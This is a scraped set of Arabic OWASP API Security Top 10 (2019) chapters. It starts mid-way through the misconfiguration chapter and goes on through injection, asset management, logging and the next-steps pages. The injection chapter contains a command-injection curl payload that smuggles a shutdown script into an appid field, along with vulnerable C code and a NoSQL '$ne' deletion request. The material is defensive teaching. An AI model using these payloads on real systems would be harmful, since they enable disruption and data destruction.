اذا كان هناك تفعيل لبعض الطلبات الغير مطلوبة مثل بعض طلبات HTTP الغير مستخدمة TREAC او DELETE على سبيل المثال.\n*  اذا لم يتم استخدام التشفير بواسطة TLS. \n* إذا لم يتم تعين سياسة مشاركة المواد بطريقة صحيحة او كان هناك خطا في الإعدادات الخاصة بها\n* إذا كانت رسائل الخطأ تحتوي على معلومات حساسة ويمكن تتبعها.   \n\n\n## امثلة على سيناريوهات الهجوم: \n\n### السيناريو الاول: \n\n يعثر المهاجم على ملف `.bash_history` في احد المسارات الرئيسية في الخادم والذي يحتوي على الأوامر التي يستخدمها المطورين في الوصول الى واجهة برمجية التطبيقات API.\n\n```\n$ curl -X GET 'https://api.server/endpoint/' -H 'authorization: Basic Zm9vOmJhcg=='\n```\n\n يمكن للمهاجم ايضاً معرفة مصادر البيانات من خلال الأوامر التي يستخدمها المطورين من خلال تكرار عملية الوصول للملف أعلاه وما حدث ذلك الا بسبب عدم توثيق الإجراءات بالشكل الصحيح.\n\n    \n### السيناريو الثاني :\n\n يقوم المهاجمون في معظم الأحيان باستخدام محركات البحث بهدف الحصول على خوادم يستطيع من خلالها الوصول الى مصدر البيانات بشكل مباشر. او من خلال البحث عن أحد المنافذ المشهورة في قواعد البيانات او في إدارة الأنظمة والخوادم.  وفي حال كان الخادم او النظام المستهدف يقوم باستخدام الأعدادت الافتراضية وغير محمي باستخدام مصادقة صحيحة قد يمكن المهاجم من الوصول للبيانات الشخصية PII والذي قد يؤدي الى تسريب بيانات المستخدمين لتلك الخدمة.\n\n### السيناريو الثالث  \n\n عند اعتراض حركة المرور للبيانات الخاصة بأحد تطبيقات الهواتف المحمولة والتي تستخدم بروتوكول TLS  في حركة البيانات ولكن  لا تعتمد على التشفير باستخدام TLS  عند استخدام واجهة برمجة التطبيقات API وبعد البحث من قبل المهاجم استطاع معرفة ان عملية تحميل ورفع الصور يتم بشكل غير مشفر، فقد وجد المهاجم نمط وطريقة لمعرفة الاستجابة الواردة من قبل الخادم او من قبل مصدر البيانات والتي قد تمكنه بطريقة او بأخرى من تتبع تفضيلات المستخدمين عند تنزيل او عرض تلك الصور.\n\n\n## كيف أمنع هذه الثغرة؟ \n\n###  دورة حياة واجهة برمجة التطبيقات API لابد ان تشتمل على : \n\n* عملية تعزيز حماية الأنظمة تساهم بشكل كبير في بناء بيئة امنة و موثوقة \n* إيجاد آلية لمراجعة الإعدادات و التحديثات بأكملها ويجب ان تتضمن مراجعة كل من ملفات الحفظ و المزامنة مكونات واجهة برمجة التطبيقات API و الخدمات السحابية.\n* توفير اتصال امن و مشفر لجميع الاتصالات في التعامل مع التطبيق او رفع وتحميل الصور.\n* عملية تقييم امني مستمر لمعرفة مستوى نضج الاعدادات في جميع انحاء البنية التحتية.\n\n### علاوة على ذلك: \n\n* لمنع تتبع الأخطاء التي قد يتم الرد بها بعد عمليات الطلب والتي قد تمكن المهاجم من استعراض البيانات الحساسة يجب ان تكون جميع الردود محدودة ومحصورة بما في ذلك عمليات الاستجابة للأخطاء.\n* تأكد انه لا يمكن الوصول الى واجهة برمجة التطبيقات API الا من خلال احد الطلبات المحددة وعدم السماح بجميع الطلبات الخاصة ببروتوكول HTTP بالعمل بل ويجب تعطيلها مثال (HEAD , TRACE).\n* يجب على واجهات برمجة التطبيقات API التي تتوقع أن يتم الوصول إليها من عملاء يستندون إلى المتصفح على سبيل المثال (الواجهة الامامية لخدمات الويب) يجب تنفيذ سياسة سليمة وموثوقة لمشاركة الموارد عبر (CORS).\n    \n\nالمراجع :\n\n* [OWASP Secure Headers Project][1]\n* [OWASP Testing Guide: Configuration Management][2]\n* [OWASP Testing Guide: Testing for Error Codes][3]\n* [OWASP Testing Guide: Test Cross Origin Resource Sharing][9]\n\n####المصادر الخارجية :\n\n* [CWE-2: Environmental Security Flaws][4]\n* [CWE-16: Configuration][5]\n* [CWE-388: Error Handling][6]\n* [Guide to General Server Security][7], NIST\n* [Let’s Encrypt: a free, automated, and open Certificate Authority][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Secure_Headers_Project\n[2]: https://www.owasp.org/index.php/Testing_for_configuration_management\n[3]: https://www.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001)\n[4]: https://cwe.mitre.org/data/definitions/2.html\n[5]: https://cwe.mitre.org/data/definitions/16.html\n[6]: https://cwe.mitre.org/data/definitions/388.html\n[7]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[8]: https://letsencrypt.org/\n[9]: https://www.owasp.org/index.php/Test_Cross_Origin_Resource_Sharing_(OTG-CLIENT-007)\n", "timestamp": "2025-10-24T22:26:16.959142"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xa8-injection.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xa8-injection.md", "content": "# API8:2019 الحقن\n\n\n| عوامل التهديد/ الاستغلال                                                                                                                                                                                 | نقاط الضعف\t                                                                                                                                                                                              | التأثير\t                                                                                                                   |\n|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------|\n| خصائص API : قابلية الاستغلال **3**\t                                                                                                                                                                          | الانتشار **2** : قابلية الاكتشاف  **3**\t                                                                                                                                                                        | التأثر التقني **3** : تأثر الأعمال                                                                                            |\n| يقوم المهاجمون بإرسال بيانات ضارة من خلال واجهة برمجة التطبيقات API وذلك من خلال حقنها بأي طريقة ممكنة ( مثل الإدخال المباشر و التعليمات البرمجية و طرق ربط الخدمات ...الخ) على أمل إرسالها إلى المفسر.\t | تعتبر ثغرات الحقن منشرة وشائعة في استعلامات SQL و LDAP و NoSQL وأوامر أنظمة التشغيل و XML parsers و ORM. واكتشاف هذه الثغرات يعتبر سهل عن مراجعة الشفرة المصدرية. بإمكان المهاجمين استخدام أدوات الفحص.\t | يمكن أن يؤدي الحقن إلى إفشاء المعلومات أو مسح وفقدان البيانات. كما يمكن أن يودي إلى حجب الخدمة DoS، أو اختراق كامل للنظام. |\n\n\n\n## هل أنا معرض لهذه الثغرة؟\n\n### قد تكون واجهة برمجة التطبيقات API معرضة للاستغلال بمثل هذه الهجمات عندما :\n\n* لا يتم تصفية البيانات أو التحقق منها في حال كانت مقدمة من المستخدمين من طريق واجهة برمجة التطبيقات.\n* يتم استخدام البيانات بشكل مباشر مع SQL/NoSQL/LDAP queries, OS commands, XML parsers.\n* لا يتم التحقق من صحة البيانات الواردة من أنظمة خارجية مثل (الأنظمة المرتبطة بالخادم) أو تصفيتها أو التحقق منها من قبل واجهة برمجة التطبيقات API قبل عملية استخدامها\n\n## أمثلة على سيناريوهات الهجوم:\n\n### السيناريو الأول:\n\nيقوم نظام جهاز التحكم الأبوي باستخدام المسار `/api/CONFIG/restore`والذي يتوقع أن يستقبل معرف التطبيق appId في أجزاء متعددة.\nفباستخدام برنامج فك وتحويل الشفرات البرمجية(decompile)، يجد المهاجم أن المعرف appId يتم تمريره مباشرة للنظام ومن غير عوامل التصفية المقترحة:\n\n```\nsnprintf(cmd, 128, \"%srestore_backup.sh /tmp/postfile.bin %s %d\",\n         \"/mnt/shares/usr/bin/scripts/\", appid, 66);\nsystem(cmd);\n```\n\n يسمح الأمر التالي للمهاجم بإغلاق أي جهاز مصاب بتلك الثغرة البرمجية\n\n```\n$ curl -k \"https://${deviceIP}:4567/api/CONFIG/restore\" -F 'appid=$(/etc/pod/power_down.sh)'\n```\n\n### السيناريو الثاني :\n\n\nلدينا تطبيق قائم على وظائف CRUD للتعامل مع الحجوزات، تمكن مهاجم من التعرف على إمكانية حقن NoSQL  من خلال الاستعلام بالمعرف الفريد للحجوزات `bookingId` وطلب الحذف بأمر كالتالي: `DELETE /api/bookings?bookingId=678`\n\nخادم واجهة برمجة التطبيقات (API Server) يستخدم الدالة التالية للتعامل مع طلبات الحذف:\n\n```javascript\nrouter.delete('/bookings', async function (req, res, next) {\n  try {\n      const deletedBooking = await Bookings.findOneAndRemove({'_id' : req.query.bookingId});\n      res.status(200);\n  } catch (err) {\n     res.status(400).json({error: 'Unexpected error occured while processing a request'});\n  }\n});\n```\n\nقام المهاجم باعتراض الطلبات الخاصة بالمعرف الفريد `bookingId`وقام بتغير أمر الاستعلام كما هو معروض بالأسفل مما أدى إلى حذف حجز يعود لمستخدم آخر:\n\n```\nDELETE /api/bookings?bookingId[$ne]=678\n```\n\n## كيف أمنع هذه الثغرة؟ \n\nلمنع عمليات الحقن انت بحاجة إلى فصل الأوامر والتعليمات البرمجية عن الاستعلامات بشكل صحيح و امن.\n\n* قم بإجراء التحقق من صحة البيانات المدخلة باستخدام مكتبة موحدة وامنه وموثوقة ويتم صيانتها بشكل دوري.\n* تحقق من صحة جميع البيانات المقدمة من المستخدم أو غيرها من البيانات الواردة من الأنظمة المتكاملة وتصفيتها.\n* يجب التعامل مع الأحرف والرموز الخاصة باستخدام الصيغة المحددة للمفسر المستهدف.\n* استخدم واجهة برمجة تطبيقات آمنة (safe API) ذات استعلامات واضحة.\n* ضع حداً لعدد السجلات التي يتم إرجاعها لمنع تسريب البيانات بشكل كبير في حالة نجاح عملية الحقن.\n* تحقق من صحة البيانات الواردة باستخدام عوامل تصفية كافية للسماح فقط بالقيم الصالحة لكل استعلام تم إدخاله.\n* عرف بشكل واضح ومحدد الانماط و أنواع البيانات المستخدمة في الاستعلامات\n\n\n## المراجع \n* [OWASP Injection Flaws][1]\n* [SQL Injection][2]\n* [NoSQL Injection Fun with Objects and Arrays][3]\n* [Command Injection][4]\n\n### مصادر خارجية :\n\n* [CWE-77: Command Injection][5]\n* [CWE-89: SQL Injection][6]\n\n[1]: https://www.owasp.org/index.php/Injection_Flaws\n[2]: https://www.owasp.org/index.php/SQL_Injection\n[3]: https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf\n[4]: https://www.owasp.org/index.php/Command_Injection\n[5]: https://cwe.mitre.org/data/definitions/77.html\n[6]: https://cwe.mitre.org/data/definitions/89.html\n", "timestamp": "2025-10-24T22:26:17.065875"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xa9-improper-assets-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xa9-improper-assets-management.md", "content": "# API9:2019  إدارة الأصول بشكل خاطئ\n\n| عوامل التهديد/ الاستغلال                                                                                                                                                                                                    | نقاط الضعف\t                                                                                                                                                                                                                                                                                                                                                                                                                                                       | التأثير\t                                                                                                                                                                           |\n|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| خصائص API : قابلية الاستغلال **3**\t                                                                                                                             | الانتشار **3** : قابلية الاكتشاف  **2**\t                                                                                                                                                                                             | قابلية التأثر التقني **2** : تأثر الأعمال\t                                                                                                                                                                                                                                                                                                                                                                                                                                 | التأثر التقني و تأثر الأعمال: 2                                                                                                                                                    |\n| إصدارات واجهة برمجة التطبيقات API القديمة غالباً غير مرقعة وتعتبر طريق سهل لاختراق الأنظمة وتجاوز العديد من تقنيات الحماية الحديثة والتي تم تركيبها غالباً لحماية الأنظمة الحديثة و المتطورة من واجهة برمجة التطبيقات API.\t | وثائق الأنظمة والبرمجيات الغير محدثة تجعل من الصعب تتبع وإصلاح الثغرات. وكذلك عدم وجود جرد للأصول التقنية واستراتيجية للتخلص من الأصول القديمة يؤدي إلى وجود أنظمة تعمل بدون ترقيعات أمنية، وذلك قد يؤدي إلى تسريب للبيانات الحساسة. وكما انه من الشائع رصد واجهة برمجة التطبيقات API متاحة على الإنترنت مع كونها لا تستخدم بسبب المفاهيم الحديثة كالخدمات المصغرة (microservices) والتي تجعل من التطبيقات سهلة النشر ومستقلة على سبيل المثال (الحوسبة السحابية)\t | قد يتمكن المهاجمون من الوصول إلى بيانات حساسة، أو حتى اختراق الخادم من خلال استغلال احد الثغرات الغير مرقعة لخدمات واجهة برمجة التطبيقات API والتي تستخدم للاتصال بقاعدة البيانات. |\n\n\n\n## هل واجهة برمجة التطبيقات API معرضة لهذه الثغرة؟\n\n### قد تكون واجهة برمجة التطبيقات معرض لمثل هذه الثغرة في حالة :\n\n* الغرض من استخدام واجهة برمجة التطبيقات غير واضح ولا توجد إجابات للأسئلة التالية:\n -  ما هي البيئة التي تعمل فيها واجهة برمجة التطبيقات (على سبيل المثال ، الإنتاج ، التدريج ، الاختبار ، التطوير)؟\n - من المخول للوصول إلى الشبكة الخاصة بواجهة برمجة التطبيقات (على سبيل المثال ، عام ، داخلي ، شركاء)؟\n - ما هو إصدار API  المستخدم؟\n - ماهي البيانات التي يتم جمعها بواسطة API؟ وهل هي بيانات شخصية؟\n - ماهي آلية سير البيانات؟\n* لا توجد وثائق معتمدة أو وثائق قديمة وغير محدثة.\n* لا توجد خطة للتخلص من إصدارة واجهة برمجة التطبيقات القديمة.\n* لا يوجد حصر للأصول أو أنه غير محدث.\n* لا يوجد حصر للخدمات المتصلة بالأنظمة سواء كانت طرف أول أو طرف ثالث أو أنه غير محدث.\n* إصدارات API قديمة وغير محدثة ولا تزال مستخدمة\n\n## أمثلة على سيناريوهات الهجوم:\n\n### السيناريو الأول:\n\nبعد إعادة تصميم التطبيقات لإحدى الخدمات، لم يتم التخلص من الإصدارة القديمة والغير محمية من واجهة برمجة التطبيقات `api.someservice.com/v1` والمتصلة بقاعدة البيانات. وبعد عمليات الفحص من قبل أحد المهاجمين توصل لعنوان واجهة برمجة التطبيقات الجديدة `api.someservice.com/v2`. باستبدال `v2` بـ `v1`  تمكن المهاجم من الوصول لواجهة برمجة التطبيقات القديمة والغير محدثة والتي أدت إلى تسريب معلومات شخصية لأكثر من 100 مليون مستخدم.\n\n### السيناريو الثاني:\n\n قامت منصة للتواصل الاجتماعي باستخدام آلية للحد من عدد محاولات تخمين كلمات المرور. آلية الأمان تلك لم يتم تطبيقها على الشفرة المصدرية الخاصة بواجهة برمجة التطبيقات API، بل قاموا بفصلها لكي تكون ما بين المستخدم وواجهة برمجة التطبيقات (`www.socialnetwork.com`).  أحد الباحثين عثر على خادم لنسخة تجريبية (`www.mbasic.beta.socialnetwork.com`) والتي يستطيع من خلالها القيام بنفس المهام التي تقوم بها الواجهة المعتمدة بما في ذلك إعادة تعين كلمات المرور لكن بدون آلية الأمان التي تحد من عدد محاولات التخمين. و باستخدام النسخة التجريبية تمكن الباحث من إعادة تعيين كلمة السر  بعد قيامة بعمليات بسيطة لتخمين كلمة المصادقة المكونة من 6 أرقام.\n\n\n\n## كيف أمنع هذه الثغرة؟\n\n* \tجرد وحصر جميع الأجهزة الخاصة بواجهة برمجة التطبيقات وتوثيق الجوانب الهامة لك واحد منهم، والتركيز بشكل كبير على بيئة API (على سبيل المثال، الإنتاج ، التدريج ، الاختبار ، التطوير)، ومن هم المخولين بالوصول لهم من الشبكة (كشبكة الإنترنت أو الداخلية أو الشركاء).\n*  \tحصر جميع الخدمات المرتبطة بالأنظمة وتوثيق جوانبها المهمة كدورها في النظام ونوعية البيانات التي يتم تداولها من خلالها وحساسية تلك البيانات.\n* \tتوثيق جميع جوانب واجهة برمجة التطبيقات API مثل عمليات التحقق والأخطاء وإعادة التوجيه وسياسة  حصر مشاركة الموارد (CORS)، بما في ذلك إعداداتها والطلبات والاستجابة لتلك الطلبات.\n* \tإنشاء الوثائق بشكل آلي من خلال تبني المعايير المفتوحة. وتضمين عملية بناء الوثائق في خط الإنتاج الخاص باختبار ونشر التطبيقات.\n* \tالتأكد من أن الوثائق متاحة للأشخاص المصرح لهم فقط.\n* \tالتأكد من استخدام التدابير الوقائية اللازمة مثل جدران الحماية الخاصة بواجهة برمجة التطبيقات API لجميع إصدارات واجهة برمجة التطبيقات المتصلة بالأنترنت وليس فقط الإصدارة  الحالية.\n* \tتجنب استخدام بيانات حقيقية من بيئة التشغيل على البيئة التجريبية لواجهة برمجة التطبيقات، وفي حال توجب عليك استخدامها فيجب أن يتم تطبيق جميع المعايير الأمنية نفسها التي يتم تطبيقها على بيئة التشغيل.\n* \tفي حال كانت الإصدارات الحديثة من واجهة برمجة التطبيقات تحتوي على معايير أمان افضل، قم بإجراء تحليل للمخاطر لاتخاذ القرارات والإجراءات التي تخفف من مخاطر الإصدار القديم. على سبيل المثال إذا كان من الممكن إضافة تلك المعايير الأمنية الجديدة للإصدار السابق من دون التأثير على التوافقية مع الأنظمة الأخرى أو أنه لابد من التخلص من الإصدار القديم و إلزام جميع المستخدمين بالانتقال إلى الإصدار الحديث.\n\n### المراجع\n\n#### المصادر الخارجية:\n\n* [CWE-1059: Incomplete Documentation][1]\n* [OpenAPI Initiative][2]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n[2]: https://www.openapis.org/\n", "timestamp": "2025-10-24T22:26:17.177095"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xaa-insufficient-logging-monitoring.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xaa-insufficient-logging-monitoring.md", "content": "# API10:2019 خلل في طريقة تسجيل الاحداث والمراقبة\n\n| عوامل التهديد/ الاستغلال                                                                                          | نقاط الضعف\t                                                                                                                                     | التأثير\t                                                                                       |\n|-------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------|\n| خصائص API : قابلية الاستغلال **2**\t                                                                                                                             | الانتشار **3** : قابلية الاكتشاف  **1**\t                                                                                   | التأثر التقني **2** : تأثر الأعمال                                                                |\n| يستغل المهاجمون عدم تسجيل الاحداث وحركة مرور البيانات بشكل صحيح للقيام بأنشطة ضارة على الأنظمة من دون أي ملاحظة.\t | عدم وجود أو خلل في آلية نظام تسجيل الاحداث و مراقبة حركة مرور البيانات ينتج عنه صعوبة في تتبع الأنشطة المشبوة والاستجابة لها في الوقت المناسب.\t | عدم وجود رؤية كاملة على الانشطة المشبوة التي تحدث تمنح المهاجمين الوقت الكافي لأختراق الأنظمة. |\n\n\n\n## هل أنا معرض لهذه الثغرة؟\n\n### سيكون النظام لديك معرض اذا كان: \n\n* لا يتم استخراج أي سجلات او لم يتم تعيين عمليات التسجيل بالشكل الصحيح او لم يتم جمع السجلات بشكل كافي وناضج.\n* عند عدم ضمان السجلات (على سبيل المثال في حال حقن السجلات بسجلات غير صحيح)\n* لا يتم مراقبة السجلات بشكل مستمر\n* لا يتم مراقبة البنية التحتية لواجهة برمجة التطبيقات API بشكل مستمر.\n    \n## امثلة على سيناريوهات الهجوم: \n\n### السيناريو الاول: \n\n عن طريق الخطأ تم تسريب احد مفاتيح إدارة المستودعات في احد المستودعات العامة، لذا تم أخطار مالك المستودع عن طريق البريد الالكتروني بشأن التسريب المحتمل، ولكن لم يقم مالك المستودع  بالتجاوب في خلال 48 ساعة والتصرف بشأن هذا التسريب، وﻷن من المحتمل استخدام هذه المفاتيح في عمليات تسريب البيانات، و بسبب عدم تسجيل الاحداث بشكل صحيح لا تستطيع الشركة تقييم ومعرفة الأصول والبيانات التي تم الوصول لها او في حال تم تسريبها.\n \n### السيناريو الثاني :\n\n منصة مشاركة ملفات الفيديو تعرضت بشكل واسع الى هجمات محاولة كسر كلمات المرور بأستخدام حسابات مستخدمين صالحة, بالرغم من المحاولات الكثيرة لعمليات تسجيل الدخول الخاطئة لم تظهر أي تنبيهات اثناء الهجوم، في حين قام المستخدمين بالشكوى لدى الشركة بشأن اغلاق حسابتهم بشكل مفاجئ، وبعد تحليل سجلات الخاصة بواجهات برمجة التطبيقات API تبين أن هناك هجوم حدث.لذا قامت الشركة أصدار اعلان لجميع المستخدمين لأعادة تهيئة كلمات المرور الخاصة بهم. \n\n\n## كيف أمنع هذه الثغرة؟ \n\n* قم بتسجيل جميع محاولات المصادقة الفاشلة او محاولات رفض الوصول للمجلدات وكذلك جميع المدخلات الخاطئة.\n* يجب كتابة السجلات بشكل متناسق لاستخدامه في عمليات إدارة السجلات ويجب ان تتضمن كافة التفاصيل التي تتيح للمحلل معرفة الأنشطة الضارة ومن قام بها.\n* يجب التعامل مع السجلات باعتبارها بيانات حساسة ويجب ضمان سلامتها اثناء المرور و التخزين.\n* قم بإعداد عمليات المراقبة واجعلها مستمرة ولتشمل البنية التحتية والشبكات و واجهة برمجة التطبيقات API.\n* استخدام أنظمة مركز سجل الأحداث SIEM  لإدارة السجلات من جميع المصادر والأنظمة و واجهات برمجة التطبيقات.\n* قم بإعداد لوحة مراقبة مخصصة للتنبيهات الأمنية وقم بتفعيل التواقيع الرقمية لرصد الأنشطة المشبوهة لرصدها في مراحلها الأولية.\n\n## المراجع : \n\n* [OWASP Logging Cheat Sheet][2]\n* [OWASP Proactive Controls: Implement Logging and Intrusion Detection][3]\n* [OWASP Application Security Verification Standard: V7: Error Handling and\n  Logging Verification Requirements][4]\n\n### المصادر الخارجية :\n\n* [CWE-223: Omission of Security-relevant Information][5]\n* [CWE-778: Insufficient Logging][6]\n\n[1]: https://www.owasp.org/index.php/Log_Injection\n[2]: https://www.owasp.org/index.php/Logging_Cheat_Sheet\n[3]: https://www.owasp.org/index.php/OWASP_Proactive_Controls\n[4]: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md\n[5]: https://cwe.mitre.org/data/definitions/223.html\n[6]: https://cwe.mitre.org/data/definitions/778.html\n", "timestamp": "2025-10-24T22:26:17.287555"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xb0-next-devs.md", "content": "# ما التالي للمطورين؟\n\nقد تكون مهمة إنشاء برامج آمنة وصيانتها ، أو إصلاح البرامج الموجودة ، صعبة. وكذلك هو الحال مع واجهات برمجة التطبيقات لا تختلف.\n\nنعتقد أن التعليم والوعي من العوامل الرئيسية لكتابة برامج آمنة. كل شيء آخر من المتطلبات هو لتحقيق الأهداف المنشودة، **وهو بالأساس يعتمد على إنشاء واستخدام عمليات أمنية قابلة للتكرار وضوابط أمنية قياسية**.\n\nلدى OWASP العديد من الموارد المجانية والمفتوحة لمعالجة مشاكل الأمن منذ بداية هذا المشروع. يرجى زيارة صفحة مشاريع أواسب للحصول على [قائمة شاملة بالمشاريع المتاحة][1].\n\n\n|                                    \t|t|\n|------------------------------------\t|t|\n| **تعليم أمن التطبيقات**            \t| يمكنك البدء في قراءة مواد مشروع OWASP التعليمي وفقًا لمهنتك واهتماماتك. للتعلم العملي ، أضفنا crAPI - Ridiculous API في خارطة الطريق الخاصة بنا. وفي الوقت نفسه ، يمكنك التدرب على WebAppSec باستخدام OWASP DevSlop Pixi Module ، وهو تطبيق ويب ضعيف وخدمة API تهدف إلى تعليم المستخدمين كيفية اختبار تطبيقات الويب الحديثة وواجهات برمجة التطبيقات للتعامل مع مشكلات الأمان ، وكيفية كتابة واجهات برمجة تكون أكثر أمانًا في المستقبل. كما يمكنك أيضًا حضور جلسات OWASP AppSec التدريبية أو الانضمام إلى فرق OWASP المحلية . \t|\n| **متطلبات أمن التطبيقات**          \t| لإنتاج تطبيقات ويب آمنة، يجب عليك تعريف معنى الأمن بالنسبة للتطبيق. أواسب تنصحك باستخدام مشروع أواسب لمعايير التحقق من أمن التطبيقات، كدليل إرشادي يساعدك في ضبط المتطلبات الأمنية لتطبيقاتك. في حال انجاز المشاريع عبر موارد خارجية، قم بمراجعة ملحق أواسب لعقود البرمجيات الآمنة.                                                                                                                                                                                                                                       \t|\n| **هيكلة أمن التطبيقات**            \t| يجب أن يظل الأمن مصدر للاهتمام خلال جميع مراحل المشروع. تعد ورقة المرجعية من OWASP (Cheat Sheet) نقطة انطلاق جيدة للإرشادات حول كيفية تصميم الأمان أثناء مرحلة البناء. من بين العديد من الاوراق الأخرى ، ستجد ورقة مراجع الأمان (Security Cheat Sheet) وورقة مراجع التقييم (Assessment Cheat Sheet.)                                                                                                                                                                                                                      \t|\n| **أدوات التحكم الأمنية المعيارية** \t| إن عملية إنشاء أدوات تحكم أمنية قوية ومناسبة للاستخدام هي مهمة صعبة جدا . إن وجود مجموعة من أدوات التحكم الأمنية المعيارية ستسهل –وبشكل جذري- عملية تطوير تطبيقات آمنة. تنصح أواسب بمشروع واجهات التطبيقات البرمجية الأمنية للمنشآت كنموذج لواجهات التطبيقات البرمجية APIs اللازمة لإنتاج تطبيقات ويب آمنة. أيضا يقدم بعض المكتبات والأدوات التي قد تجدها ذات قيمة ، مثل التحقق من صحة أدوات التحكم.                                                                                                                      \t|\n| **دورة حياة التطوير الآمنة**       \t| يمكنك استخدام OWASP Software Assurance Maturity Model (SAMM) لتحسين العملية عند إنشاء واجهات برمجة التطبيقات API. تتوفر العديد من مشاريع OWASP الأخرى لمساعدتك خلال مراحل تطوير API المختلفة ، على سبيل المثال ، مشروع مراجعة كود OWASP.                                                                                                                                                                                                                                                                                  \t|\n\n\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Project\n[2]: https://www.owasp.org/index.php/OWASP_Education_Material_Categorized\n[3]: https://www.owasp.org/index.php/OWASP_API_Security_Project#tab=Road_Map\n[4]: https://devslop.co/Home/Pixi\n[5]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[6]: https://www.owasp.org/index.php/OWASP_Chapter\n[7]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[8]: https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex\n[9]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[10]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Security_Cheat_Sheet.md\n[11]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[12]: https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2018\n[13]: https://www.owasp.org/index.php/OWASP_SAMM_Project\n[14]: https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project\n", "timestamp": "2025-10-24T22:26:17.399260"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xb1-next-devsecops.md", "content": "# ما التالي لمطوري الممارسات الامنية في التطبيقات؟  \n\n نظرًا لأهميتها في بناء التطبيقات الحديثة ، فإن بناء واجهات برمجة آمنة أمر في غاية الأهمية ، ويجب أن يكون الأمن جزءًا من دورة حياة التطوير بأكملها. لم تعد اختبارات الاختراق السنوية كافية.\n يجب أن تنضم DevSecOps إلى جهود التطوير ، مما يسهل اختبار الأمان المستمر عبر دورة حياة تطوير البرامج بأكملها. هدفهم هو تعزيز طريق التطوير بأتمتة الأمان ، ودون التأثير على سرعة التطوير.\n    \nاذا كنت تود الاطلاع والمراجعة ، راجع https://www.devsecops.org/ \n\n| فهم نماذج التهديد\t             | تأتي أولويات الاختبار من نماذج التهديد المتوقعة. إذا لم يكن لديك واحد ، ففكر في استخدام OWASP Application Security Verification Standard (ASVS) ، ودليل اختبار OWASP كمدخل. قد يساعد في رفع مستوى الوعي لفريق التطوير.                                                                                                                                |\n|--------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| فهم دورة حياة التطبيقات\t       | قم بالانضمام الى فريق تطوير البرمجيات لفهم دورة حياة البرامج. حيث ان مساهمتك في اختبار الامان بشكل مستمر ومتوافق مع الادوات والعمليات والاجراءات التي يتفق عليها الجميع وبشكل سلسل.                                                                                                                                                                   |\n| استراتيجيات الاختبار\t          | لا يجب ان تؤثر اعمالك على سرعة وتيرة التطوير بل يجب أن تختار بحكمة الأسلوب الأفضل (البسيط والأسرع والأكثر دقة) للتحقق من متطلبات الأمان. يمكن أن يكون إطار OWASP للمعرفة الأمنية ومعيار OWASP للتحقق من أمان التطبيقات مصادر جيدة لمتطلبات الأمان الوظيفية وغير الوظيفية. هناك مصادر أخرى للمشاريع والأدوات المشابهة لتلك التي يقدمها مجتمع DevSecOps |\n| تحقيق التغطية والدقة المطلوبة\t | أنت حلقة الوصل بين المطورين وفرق العمليات. لتحقيق التغطية بالشكل المطلوب ، لا يجب أن تركز فقط على آلية عملها فقط ، ولكن أيضًا على التنسيق بشكل سليم. وذلك من خلال العمل بالقرب من فرق التطوير والعمليات من البداية حتى تتمكن من استغلال الجهود المبذولة. يجب أن تهدف إلى حالة دائمة من تحقيق معايير الأمان بشكل أساسي ومستمر.                         |\n| ايصال النتائج بشكل واضح\t       | قم بالمشاركة في صنع قيمة مع اقل اختلاف مع فرق العمل. وقم بتسليم النتائج في الوقت المناسب ، باستخدام الأدوات المتاحة من قبل الفريق، انضم إلى فريق التطوير لمعالجة النتائج والمخرجات وقم بشرح ووصف نقاط الضعف بشكل واضح جداً وكيف سيتم إساءة استخدامها وقم بذكر بعض السيناريوهات الحقيقة لاستغلالها .                                                   |\n\n\n\n[1]: https://www.devsecops.org/\n[2]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[3]: https://www.owasp.org/index.php/OWASP_Testing_Project\n[4]: https://www.owasp.org/index.php/OWASP_Security_Knowledge_Framework\n[5]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[6]: http://devsecops.github.io/\n[7]: https://github.com/devsecops/awesome-devsecops\n[8]: http://devsecops.org\n", "timestamp": "2025-10-24T22:26:17.501884"}
